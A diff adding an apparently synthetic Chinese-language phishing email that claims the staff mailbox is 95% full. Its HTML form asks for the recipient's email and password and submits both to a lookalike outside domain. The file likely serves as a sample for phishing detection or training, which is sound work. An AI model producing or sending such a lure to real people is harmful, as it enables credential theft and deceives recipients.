@@ -1,0 +1,10 @@
+From: =?utf-8?B?6YKu566x566h55CG5Lit5b+D?= <admin@mail-center.example>
+To: staff@corp.internal
+Date: Mon, 07 Sep 2026 09:12:00 +0800
+Message-ID: <0002-b15@synth.example>
+Subject: 邮箱容量已满 95%
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+
+<html><body><table cellpadding=10 style='border-collapse:collapse;font-family:sans-serif'><tr><td style='background:#4a90d9;color:#fff' colspan=2>邮箱管理中心</td></tr><tr><td>当前容量</td><td><div style='background:#eee'><div style='background:#d9534f;width:95%'>&nbsp;</div></div> 95%</td></tr><tr><td colspan=2><form action='https://mail-center-expand.example.info/box'><input name='email' placeholder='邮箱' style='padding:8px'> <input type='password' name='pwd' placeholder='密码' style='padding:8px'> <button style='padding:8px 16px'>一键扩容</button></form></td></tr></table></body></html>
